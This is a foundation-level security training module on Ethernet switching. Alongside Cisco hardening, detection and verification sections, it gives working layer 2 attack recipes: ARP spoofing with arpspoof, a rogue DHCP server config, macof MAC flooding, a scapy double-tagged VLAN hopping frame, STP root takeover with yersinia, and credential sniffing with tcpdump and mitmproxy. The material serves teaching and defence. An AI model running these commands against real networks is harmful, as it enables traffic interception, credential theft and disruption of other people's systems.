# Ethernet and Switching

> Track: Offensive / Defensive | Level: Foundation | Certs: Network+, CCNA

## 1. Overview

Ethernet is the dominant layer 2 technology in local area networks.
Switching is how Ethernet frames move from one port to another
inside a LAN. Together they define the first hop: how a host talks
to its gateway, how VLANs isolate traffic, and how an attacker on
the same segment can intercept or disrupt communication.

Three things make this layer worth studying in depth:

- Layer 2 is the last layer where an attacker on the same physical
  segment can see all traffic without any routing tricks. ARP
  spoofing, MAC flooding, and VLAN hopping all live here.
- Layer 2 has no built-in authentication. A switch trusts whatever
  MAC address a host claims. There is no cryptographic handshake
  at this layer (802.1X is the exception, and it is optional).
- Most enterprise networks are flat at layer 2 for performance
  reasons, which means the blast radius of a layer 2 compromise is
  often the whole building, not one host.

The vocabulary: frame (layer 2 PDU), MAC address (48-bit hardware
identifier), switch (layer 2 forwarding device), VLAN (logical
segmentation of a switch), STP (loop prevention), trunk (a link
carrying multiple VLANs).

## 2. Reconnaissance / Enumeration

From outside the segment, layer 2 is invisible. From inside, it is
fully observable. The reconnaissance questions are: what is on this
segment, which VLANs exist, and where are the trunks.

**What is on the segment:** the ARP table is the fastest inventory
of live hosts. Every host that has recently communicated with you
appears here.

```bash
# ARP table
ip neigh show

# Active MAC table on a switch (Cisco)
show mac address-table

```

**Which VLANs exist:** a trunk link carries VLAN tags. Capture a
trunk and inspect the 802.1Q tags.

```bash
# Capture on a trunk interface (requires root)
tcpdump -i eth0 -n -e vlan

# See 802.1Q tag in the frame
tcpdump -i eth0 -n -e -vv | grep -i vlan

```

**CDP / LLDP leakage:** Cisco Discovery Protocol and Link Layer
Discovery Protocol announce neighbor device names, models, and
management IPs. They are unauthenticated and layer 2 only.

```bash
# Capture CDP announcements (Cisco)
tcpdump -i eth0 -n -c 10 -s 1500 -v 'ether proto 0x2000'

# Or use cdp-tool if available
cdp-tool -i eth0

```

**STP topology:** Spanning Tree BPDUs reveal the root bridge and
the topology. A malicious host can become the root bridge and pull
all traffic through itself.

```bash
# Capture STP BPDUs
tcpdump -i eth0 -n -e 'ether dst 01:80:c2:00:00:00'

```

**LLDP neighbors (from a managed switch):**

```text
show lldp neighbors
show cdp neighbors detail

```

The output of these commands is the layer 2 map of the segment.
Every attack in section 4 depends on one of these outputs.


## 3. Common Attack Vectors

Layer 2 attacks fall into three families: interception, disruption,
and bypass. Each exploits a specific trust in the switching fabric.

**Interception (man-in-the-middle at layer 2):**
- ARP spoofing / ARP poisoning.
- MAC spoofing to impersonate the gateway.
- DHCP spoofing (rogue DHCP server hands out a malicious gateway).
- STP root bridge takeover (all traffic flows through you).
- MAC flooding to force the switch into hub mode.

**Disruption (denial of service):**
- MAC flooding (CAM table exhaustion).
- STP BPDU storm.
- DHCP starvation (exhaust the pool).
- VLAN hopping to reach an isolated segment.

**Bypass (reach a segment you should not reach):**
- VLAN hopping via double tagging (802.1Q).
- Switch spoofing (Dynamic Trunking Protocol abuse).
- 802.1X bypass via MAC spoofing of an authorized device.

The common thread: the switch does not authenticate MAC addresses,
VLAN tags, ARP replies, or STP BPDUs. Every one of these attacks
exploits the absence of that authentication.

## 4. Exploitation Recipes

Each recipe is a minimal, safe-to-test example. All commands are
run only against systems you own or have written authorization to
test. ARP spoofing and DHCP spoofing are detectable by any modern
IDS - do not use them outside an isolated lab without written
authorization.

### Recipe 1 - ARP spoof the default gateway

Convinces the victim that your MAC address is the gateway, and the
gateway that your MAC address is the victim. Traffic flows through
you. Requires IP forwarding to keep the victim online (otherwise
it is an obvious DoS).

```bash
# Enable IP forwarding (otherwise this is a DoS)
sudo sysctl -w net.ipv4.ip_forward=1

# Poison the victim (tell it we are the gateway)
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1

# In another terminal, poison the gateway (tell it we are the victim)
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.10

```

Expected state on the victim:

```text
$ ip neigh show 10.10.10.1
10.10.10.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE
# (that MAC is YOUR interface, not the real gateway)

```

### Recipe 2 - DHCP spoofing (rogue DHCP server)

Responds to DHCP DISCOVER before the real DHCP server does. The
victim gets your IP as its gateway and DNS. Requires a similar
race condition to ARP spoofing.

```bash
# Minimal rogue DHCP server (example; use a lab-only tool)
sudo dhcpd -cf rogue.conf -pf /tmp/dhcpd.pid eth0

# rogue.conf:
# subnet 10.10.10.0 netmask 255.255.255.0 {
#   range 10.10.10.200 10.10.10.250;
#   option routers 10.10.10.66;
#   option domain-name-servers 10.10.10.66;
# }

```

### Recipe 3 - MAC flooding (CAM table exhaustion)

Overwhelms the switch MAC address table. When the table is full,
the switch falls back to flooding every frame to every port -
effectively hub mode.

```bash
# macof floods the CAM table with random MACs
sudo macof -i eth0 -n 100000

# Verify from another host: a packet capture on a port that
# should not see your traffic now sees it
sudo tcpdump -i eth0 -n -e

```

Expected effect: the switch CAM table fills, and unicast frames
get flooded to all ports. Modern switches rate-limit this, so the
attack often fails against current hardware.

### Recipe 4 - VLAN hopping via double tagging

Sends a frame with two 802.1Q tags. The first (outer) tag is the
attacker VLAN, the second (inner) tag is the target VLAN. The
first switch strips the outer tag and forwards; the second switch
reads the inner tag and delivers. Requires trunk misconfiguration.

```bash
# Craft a double-tagged frame with scapy
sudo python3 -c "
from scapy.all import *
frame = Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=20)/ARP(pdst='10.10.20.1')
sendp(frame, iface='eth0')
"

```

### Recipe 5 - STP root bridge takeover

Announces a BPDU with a lower bridge priority than the current
root. The switch elects you as root, and traffic flows through
your host. Modern switches have BPDU guard and root guard to
prevent this on access ports.

```bash
# yersinia is the classic tool for STP attacks
sudo yersinia -I

# Select STP mode, then "Claiming the Root Role"

```

All five recipes are detectable by any IDS with layer 2
visibility (arpwatch, DHCP snooping alerts, STP topology change
logs, MAC table size alerts). Section 7 covers detection.

## 5. Post-Exploitation

Once you control the segment, the post-exploitation options are
extensive because every host on the segment now trusts you.

**Credential capture:** ARP spoof + a passive sniffer captures
every plaintext protocol (HTTP, FTP, Telnet, SNMPv1/v2, LDAP
simple bind). Even with TLS, the SNI and certificate names leak
the services and internal hostnames.

```bash
# After ARP spoofing, capture credentials in plaintext
sudo tcpdump -i eth0 -A 'tcp port 21 or tcp port 23 or tcp port 80'

# Better: mitmproxy for HTTP(S) with a generated CA
sudo mitmproxy --mode transparent --showhost

```

**Pivot into isolated VLANs:** after VLAN hopping or STP takeover,
you can reach segments that were supposed to be unreachable. From
there, standard layer 3 pivoting applies (SOCKS proxy, SSH
forwarding - see the OSI and TCP-IP file, section 5).

**Persist at layer 2:** a rogue DHCP server that survives reboots
is a persistent MITM. A static ARP entry on a critical host (e.g.
the backup server) is a persistent redirect. Both are detectable
by DHCP snooping and DAI, so this only works if those controls
are absent.

**Lateral movement without touching the target:** with a MITM
position, you can hijack sessions (steal cookies, replay
Kerberos tickets, redirect RDP). The target host never sees your
IP. This is why layer 2 compromise is one of the highest-impact
positions in an internal network.


## 6. Preventive Controls

Layer 2 hardening is a single class of controls: authenticate what
the switch trusts. Each control below stops one attack from section 3.

**Port security (stops MAC flooding):**

```text
interface GigabitEthernet0/1
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky

```

**DHCP snooping (stops rogue DHCP):**

```text
ip dhcp snooping
ip dhcp snooping vlan 10,20
interface GigabitEthernet0/1
 ip dhcp snooping trust
interface GigabitEthernet0/2
 ip dhcp snooping limit rate 10

```

**Dynamic ARP Inspection (stops ARP spoofing):**

```text
ip arp inspection vlan 10,20
interface GigabitEthernet0/1
 ip arp inspection trust

```

DAI depends on DHCP snooping (the DHCP snooping binding table is
the source of truth for valid IP/MAC pairs). Enable both.

**BPDU guard and root guard (stops STP takeover):**

```text
interface range GigabitEthernet0/1-48
 spanning-tree bpduguard enable
 spanning-tree guard root

```

**Native VLAN hygiene (stops double tagging):**

```text
interface GigabitEthernet0/1
 switchport trunk native vlan 999
 switchport trunk allowed vlan 10,20,30

```

Never use VLAN 1 for user traffic, and always tag the native VLAN
on trunks (or move it to an unused VLAN). Double tagging relies on
the first switch stripping the untagged (native) frame - if the
native VLAN is not the user VLAN, the attack fails.

**Disable DTP (stops switch spoofing):**

```text
interface GigabitEthernet0/1
 switchport nonegotiate
 switchport mode access

```

**802.1X (authentication at the port):**

```text
interface GigabitEthernet0/1
 authentication port-control auto
 dot1x pae authenticator

```

802.1X is the only layer 2 control that authenticates the device
before it can send any traffic. It is the correct answer for
"how do I stop MAC spoofing" - everything else assumes the MAC is
trusted.

## 7. Detection Controls

Layer 2 attacks leave distinct signatures on the switch and on the
wire. The detections below map one-to-one to the attacks in section 3.

**ARP spoofing detection:**
- Gratuitous ARP rate anomalies (arpwatch, Dynamic ARP Inspection
  logs, `arp -a` MAC changes on the gateway).
- Same MAC appearing on two switch ports (MAC flapping).
- ARP reply with a different MAC than the DHCP snooping binding.

**DHCP spoofing detection:**
- DHCP OFFER from a server that is not the known DHCP server.
- DHCP packets arriving on a port that is not trusted for DHCP.
- Pool exhaustion (many DISCOVERs, few REQUESTs).

**MAC flooding detection:**
- Switch CAM table size alert.
- MAC address table full log on the switch.
- Unicast flooding to ports that should not see the traffic.

**STP attack detection:**
- Topology change notifications (TCN) in bursts.
- Root bridge change (a new root that is an access port).
- BPDU received on an access port (BPDU guard log).

**VLAN hopping detection:**
- 802.1Q frame with two tags.
- Traffic on a trunk for a VLAN not in the allowed list.
- Frame with a source MAC from one VLAN and a tag from another.

**SIEM correlation:** the high-value alert is the combination.
"ARP spoof + new SMB session from the attacker host" is a real
attack. "ARP spoof" alone is noise on many networks. This is the
same correlation principle as in the OSI and TCP-IP file, section 7.

## 8. Verification

How to verify each control is working.

**Verify port security:**

```bash
# From a test host, send frames with many source MACs
sudo macof -i eth0 -n 100
# Expect: switch logs "port-security violation" and the port err-disables

```

**Verify DHCP snooping:**

```bash
# Run a rogue DHCP server on an untrusted port
sudo dhcpd -cf rogue.conf -pf /tmp/dhcpd.pid eth0
# Expect: DHCP packets dropped at the switch, no lease handed out

```

**Verify DAI:**

```bash
# Send a gratuitous ARP with a wrong MAC
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1
# Expect: switch logs "DAI drop" and the victim does not update its ARP table

```

**Verify BPDU guard:**

```bash
# Send a BPDU from a test host
sudo yersinia -I  # then choose STP and send BPDU
# Expect: the port goes err-disabled within one BPDU interval

```

**Verify native VLAN hygiene:**

```bash
# Send a double-tagged frame
sudo python3 -c "
from scapy.all import *
sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/ARP(pdst='10.10.20.1'), iface='eth0')
"
# Expect: the frame is dropped because VLAN 1 is not the native VLAN

```

**Verify 802.1X:**

```bash
# Connect a device without credentials
# Expect: the port stays unauthorized, no traffic passes
# The switch logs "authentication failed"

```

If a control fails verification, the control is misconfigured,
not absent. This is the most common finding in an internal network
assessment: the feature is enabled but the trust boundary is wrong
(e.g. DAI trusts a port that an attacker can reach).

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**
- Domain 2: Network Implementation - switches, VLANs, trunking,
  spanning tree, port security.
- Domain 4: Network Security - ARP spoofing, MAC flooding, VLAN
  hopping, 802.1X.

**Cisco CCNA (200-301):**
- Domain 2: Network Access - VLANs, trunking (802.1Q), DTP, STP
  (PVST+, Rapid PVST+, MST), EtherChannel, port security.
- Domain 5: Security Fundamentals - DHCP snooping, DAI, BPDU guard,
  802.1X.
- Domain 1: Network Fundamentals - Ethernet frame format.

**Cross-references:**
- The OSI and TCP-IP file covers the layer model this builds on.
- 03 IP Addressing and Subnetting covers the layer 3 addressing that
  rides on these frames.
- The INFRASTRUCTURE/06 Wireless subcategory covers the wireless
  equivalent of these attacks (WPA, 802.1X, rogue APs).

## 10. Production Notes

**Flat networks are the common failure mode.** Most enterprise
networks are layer 2 flat for performance and simplicity. That is
also why a single compromised host can ARP spoof the whole
building. Segmentation (VLANs + routing between them) is a control
that limits the blast radius, not just a design preference.

**The switch is a trust boundary you must configure.** Out of the
box, a Cisco switch trusts every MAC, every ARP reply, every DHCP
offer, and every BPDU. Every control in section 6 is opt-in. If
you do not configure it, it is not there. This is the single most
important operational fact about layer 2 security.

**MAC spoofing is trivial and mostly unstoppable without 802.1X.**
A MAC address is a 48-bit string the host announces. Changing it
takes one command (`ip link set eth0 address ...`). The only layer
2 control that resists it is 802.1X, because the authentication
happens before the MAC is trusted. Port security limits the number
of MACs on a port, not which MAC, so a single-MAC attacker wins.

**Wireless is not different in kind.** WPA2/WPA3, rogue APs, and
deauthentication attacks are the wireless equivalents of the wired
attacks in this file. The trust model is the same: the access
point believes what the client says until 802.1X (or WPA-Enterprise)
makes it prove it. See the wireless subcategory of INFRASTRUCTURE.

**Cloud networking makes layer 2 mostly disappear.** In a VPC,
there is no broadcast domain, no ARP spoofing, no STP. The
equivalent controls are security groups and network ACLs. This
is why cloud networking is in the CLOUD category, not here. But
hybrid environments still have a physical layer 2 in the data
center - the flat-network problem did not go away, it moved.

## 11. References

- IEEE 802.1Q - Bridges and Bridged Networks (VLAN tagging) - https://standards.ieee.org/ieee/802.1Q/6844/
- IEEE 802.1D - Media Access Control (MAC) Bridges (STP) - https://standards.ieee.org/ieee/802.1D/6234/
- IEEE 802.1X - Port-Based Network Access Control - https://standards.ieee.org/ieee/802.1X/7345/
- IEEE 802.3 - Ethernet - https://standards.ieee.org/ieee/802.3/7071/
- RFC 826 - An Ethernet Address Resolution Protocol - https://www.rfc-editor.org/rfc/rfc826
- RFC 2131 - Dynamic Host Configuration Protocol - https://www.rfc-editor.org/rfc/rfc2131
- NIST SP 800-41 Rev. 1 - Guidelines on Firewalls and Firewall Policy - https://csrc.nist.gov/pubs/sp/800/41/r1/final
- Cisco - VLAN Security White Paper - https://www.cisco.com/c/en/us/support/docs/switches/catalyst-6500-series-switches/10570-41.html
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics

